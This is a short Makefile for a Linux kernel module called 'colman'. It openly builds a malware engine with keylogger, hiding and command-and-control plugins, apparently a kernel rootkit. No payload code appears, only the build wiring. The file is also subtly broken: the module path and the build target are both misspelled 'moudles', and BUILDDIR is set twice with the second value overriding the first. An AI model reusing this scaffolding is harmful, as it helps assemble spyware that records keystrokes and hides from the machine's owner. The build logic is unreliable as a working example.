# Module name
PROGRAM			:= colman

# Build
MODULEDOR 		:= /lib/moudles/$(shell uname -r)
BUILDDIR		:= $(MODULEDOR)/build
BUILDDIR		:= $(MODULEDOR)/kernel

# Src files
SRCS_S 			:= src
PLUGINS_S		:= src/plugins
INCL_S			:= src/includes
	
# Hdr files
SRCS_H 			:= $(PWD)/$(SRCS_S)/headers
PLUGINS_H		:= $(PWD)/$(PLUGINS_S)/headers
INCL_H			:= $(PWD)/$(INCL_S)/headers


# Module
obj-m			:= $(PROGRAM).o

# Main
$(PROGRAM)-y	+= src/engine.o

# Malware plugins
$(PROGRAM)-y	+= src/plugins/keylogger.o
$(PROGRAM)-y	+= src/plugins/hidder.o
$(PROGRAM)-y	+= src/plugins/cnc.o



ccflags-y 		:= -I$(SRCS_H) -I$(INCL_H) -I$(PLUGINS_H)


all:
	$(MAKE) -C $(BUILDDIR) M=$(PWD) moudles


clean:
	$(MAKE) -C $(BUILDDIR) M=$(PWD) clean

	 